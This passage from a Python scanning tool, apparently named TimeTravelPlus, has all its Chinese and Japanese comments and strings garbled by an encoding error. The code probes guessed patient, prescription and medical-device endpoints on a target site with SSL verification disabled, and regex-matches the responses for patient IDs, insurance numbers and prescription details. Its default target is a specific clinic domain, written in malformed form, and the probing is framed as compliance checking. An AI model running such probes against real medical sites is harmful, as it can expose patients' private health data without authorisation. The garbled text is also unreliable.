                'recepta': 'è–¬æ©Ÿæ³•ãƒ»å€‹äººæƒ…å ±ä¿è­·æ³•ãƒ»åŒ»å¸«æ³•',
                'rezept': 'ä¿é™ºåŒ»ç™‚æ³•ãƒ»è¨ºç™‚å ±é…¬è«‹æ±‚è¦å‰‡ãƒ»å€‹äººæƒ…å ±ä¿è­·æ³•'
            }
            
            return compliance_impacts.get(system_key, 'ä¸€èˆ¬åŒ»ç™‚æ³•è¦')
        
        async def _analyze_personal_info_protection(self, target_url: str) -> List[Dict]:
            """åˆ†æä¸ªäººæƒ…æŠ¥ä¿æŠ¤æ³•åˆè§„æ€§"""
            issues = []
            
            # æ£€æŸ¥æ˜¯å¦æœ‰æ‚£è€…ä¿¡æ¯æ³„éœ²
            patient_endpoints = [
                '/api/patient',
                '/patient/search',
                '/patients',
                '/è¨ºç™‚æƒ…å ±',
                '/æ‚£è€…æƒ…å ±'
            ]
            
            async with aiohttp.ClientSession() as session:
                for endpoint in patient_endpoints:
                    url = urljoin(target_url, endpoint)
                    try:
                        async with session.get(url, timeout=10, ssl=False) as resp:
                            if resp.status == 200:
                                content = await resp.text()
                                
                                # æ£€æŸ¥æ˜¯å¦åŒ…å«æ•æ„Ÿä¿¡æ¯
                                if self._contains_personal_info(content):
                                    issues.append({
                                        'type': 'personal_info_exposure',
                                        'endpoint': endpoint,
                                        'description': 'æ‚£è€…ä¸ªäººä¿¡æ¯å¯èƒ½æš´éœ²',
                                        'law_violation': 'å€‹äººæƒ…å ±ä¿è­·æ³•ç¬¬23æ¡é•å',
                                        'severity': 'critical'
                                    })
                    except Exception:
                        continue
            
            return issues
        
        def _contains_personal_info(self, content: str) -> bool:
            """æ£€æŸ¥æ˜¯å¦åŒ…å«ä¸ªäººä¿¡æ¯"""
            personal_info_patterns = [
                r'\d{4}-\d{2}-\d{2}',  # æ—¥æœŸ
                r'\d{3}-\d{4}-\d{4}',  # ç”µè¯å·ç 
                r'æ‚£è€…ID[:ï¼š]\s*\w+',
                r'è¨ºå¯Ÿåˆ¸ç•ªå·[:ï¼š]\s*\w+',
                r'ä¿é™ºè¨¼ç•ªå·[:ï¼š]\s*\w+'
            ]
            
            for pattern in personal_info_patterns:
                if re.search(pattern, content):
                    return True
            
            return False
        
        async def _analyze_medical_device_compliance(self, target_url: str) -> List[Dict]:
            """åˆ†æåŒ»ç–—æœºå™¨æ³•åˆè§„æ€§"""
            risks = []
            
            # æ£€æŸ¥åŒ»ç–—è®¾å¤‡ç›¸å…³ç«¯ç‚¹
            device_endpoints = [
                '/dicom',
                '/pacs',
                '/medical-device',
                '/è¨ºæ–­è£…ç½®',
                '/åŒ»ç™‚æ©Ÿå™¨'
            ]
            
            async with aiohttp.ClientSession() as session:
                for endpoint in device_endpoints:
                    url = urljoin(target_url, endpoint)
                    try:
                        async with session.get(url, timeout=10, ssl=False) as resp:
                            if resp.status in [200, 401, 403]:
                                risks.append({
                                    'type': 'medical_device_exposure',
                                    'endpoint': endpoint,
                                    'description': 'åŒ»ç–—è®¾å¤‡æ¥å£æš´éœ²',
                                    'regulation': 'åŒ»ç™‚æ©Ÿå™¨æ³•ãƒ»è–¬æ©Ÿæ³•',
                                    'severity': 'high'
                                })
                    except Exception:
                        continue
            
            return risks
        
        async def _analyze_pharmaceutical_compliance(self, target_url: str) -> List[Dict]:
            """åˆ†æè¯äº‹æ³•åˆè§„æ€§"""
            violations = []
            
            # æ£€æŸ¥å¤„æ–¹ç›¸å…³ç«¯ç‚¹
            pharma_endpoints = [
                '/prescription',
                '/medication',
                '/å‡¦æ–¹ç®‹',
                '/è–¬å‰¤',
                '/åŒ»è–¬å“'
            ]
            
            async with aiohttp.ClientSession() as session:
                for endpoint in pharma_endpoints:
                    url = urljoin(target_url, endpoint)
                    try:
                        async with session.get(url, timeout=10, ssl=False) as resp:
                            if resp.status == 200:
                                content = await resp.text()
                                
                                # æ£€æŸ¥å¤„æ–¹ä¿¡æ¯æ³„éœ²
                                if self._contains_prescription_info(content):
                                    violations.append({
                                        'type': 'prescription_data_exposure',
                                        'endpoint': endpoint,
                                        'description': 'å¤„æ–¹ä¿¡æ¯å¯èƒ½æ³„éœ²',
                                        'law_violation': 'è–¬æ©Ÿæ³•ãƒ»åŒ»å¸«æ³•è¿å',
                                        'severity': 'critical'
                                    })
                    except Exception:
                        continue
            
            return violations
        
        def _contains_prescription_info(self, content: str) -> bool:
            """æ£€æŸ¥æ˜¯å¦åŒ…å«å¤„æ–¹ä¿¡æ¯"""
            prescription_patterns = [
                r'å‡¦æ–¹ç®‹ç•ªå·[:ï¼š]\s*\w+',
                r'è–¬å“å[:ï¼š]\s*\w+',
                r'æŠ•ä¸é‡[:ï¼š]\s*\w+',
                r'å‡¦æ–¹åŒ»[:ï¼š]\s*\w+'
            ]
            
            for pattern in prescription_patterns:
                if re.search(pattern, content):
                    return True
            
            return False
        
        def _generate_compliance_recommendations(self, analysis_results: Dict) -> List[str]:
            """ç”Ÿæˆåˆè§„æ€§å»ºè®®"""
            recommendations = []
            
            if analysis_results['detected_systems']:
                recommendations.append("å®Ÿè£…æ¨å¥¨: åŒ»ç™‚ã‚·ã‚¹ãƒ†ãƒ ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã®å¼·åŒ–")
                recommendations.append("å®Ÿè£…æ¨å¥¨: å®šæœŸçš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ã®å®Ÿæ–½")
            
            if analysis_results['data_protection_issues']:
                recommendations.append("ç·Šæ€¥å¯¾å¿œ: å€‹äººæƒ…å ±ä¿è­·æ³•ã«åŸºã¥ããƒ‡ãƒ¼ã‚¿æš—å·åŒ–")
                recommendations.append("ç·Šæ€¥å¯¾å¿œ: ã‚¢ã‚¯ã‚»ã‚¹ãƒ­ã‚°ã®è©³ç´°è¨˜éŒ²ã¨ç›£è¦–")
            
            if analysis_results['regulatory_risks']:
                recommendations.append("æ³•çš„å¯¾å¿œ: åŒ»ç™‚æ©Ÿå™¨æ³•ã«åŸºã¥ãã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£åŸºæº–éµå®ˆ")
                recommendations.append("æ³•çš„å¯¾å¿œ: åšç”ŸåŠ´åƒçœã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³æº–æ‹ ã®ç¢ºèª")
            
            if analysis_results['compliance_violations']:
                recommendations.append("å³åº§å¯¾å¿œ: è–¬äº‹æ³•é•åãƒªã‚¹ã‚¯ã®ç·Šæ€¥ä¿®æ­£")
                recommendations.append("å³åº§å¯¾å¿œ: å‡¦æ–¹ç®‹æƒ…å ±ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è¦‹ç›´ã—")
            
            return recommendations

async def main():
    import sys
    
    print("  æ—¶é—´æ—…è¡ŒPlus - ä¼ä¸šçº§é…ç½®ç‰ˆæœ¬")
    print("=" * 50)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("è¯·è¾“å…¥ç›®æ ‡URL [é»˜è®¤: https/asanoha-clinic.com]: ").strip()
        if not target:
            target = "https/asanoha-clinic.com"
    
    #   åˆ›å»ºé…ç½®å¯¹è±¡ï¼ˆå¯ä»¥ä»æ–‡ä»¶æˆ–ç¯å¢ƒå˜é‡è¯»å–ï¼‰
    config = TimeTravelConfig()
    print(f"  é…ç½®åŠ è½½å®Œæˆ:")
    print(f"   æœ€å¤§å¹¶å‘æ•°: {config.DEFAULT_MAX_CONCURRENT}")
    print(f"   æ‰¹é‡å¤§å°: {config.BATCH_SIZE}")
    print(f"   å†…å­˜é™åˆ¶: {config.DEFAULT_MAX_RECORDS:,} æ¡è®°å½•")
    print("=" * 50)
    
    # åˆ›å»ºæ—¶é—´æ—…è¡Œå™¨å®ä¾‹
    time_traveler = TimeTravelPlus(target, config)
    
    # å¼€å§‹æ‰§è¡Œ
    start_time = time.time()
    results = await time_traveler.run()
    total_time = time.time() - start_time
    
    #   æ˜¾ç¤ºæ€§èƒ½æŒ‡æ ‡æ‘˜è¦
    print("\n" + "=" * 50)
    print("  æ€§èƒ½æŒ‡æ ‡æ‘˜è¦")
    print("=" * 50)
    
    final_metrics = time_traveler.performance_metrics.calculate_final_metrics()
    scheduler_metrics = time_traveler.request_scheduler.performance_metrics.calculate_final_metrics()
    
    print(f"æ€»æ‰§è¡Œæ—¶é—´: {total_time:.2f}s")
    print(f"æ€»è¯·æ±‚æ•°: {final_metrics['total_requests'] + scheduler_metrics['total_requests']}")
    print(f"æˆåŠŸç‡: {((final_metrics['successful_requests'] + scheduler_metrics['successful_requests']) / max(1, final_metrics['total_requests'] + scheduler_metrics['total_requests']) * 100):.1f}%")
    print(f"å¹³å‡å“åº”æ—¶é—´: {scheduler_metrics.get('average_response_time', 0):.3f}s")
    print(f"ç¼“å­˜å‘½ä¸­ç‡: {final_metrics.get('cache_hit_rate', 0):.1f}%")
    print(f"å³°å€¼å¹¶å‘æ•°: {scheduler_metrics.get('concurrent_peak', 0)}")
    print(f"æ•°æ®è®°å½•æ•°: {len(time_traveler.data_records):,}")
    print(f"å»é‡æ•ˆç‡: {len(time_traveler.memory_manager.data_hashes) / max(1, len(time_traveler.data_records)) * 100:.1f}%")
    print("=" * 50)

if __name__ == "__main__":
    asyncio.run(main())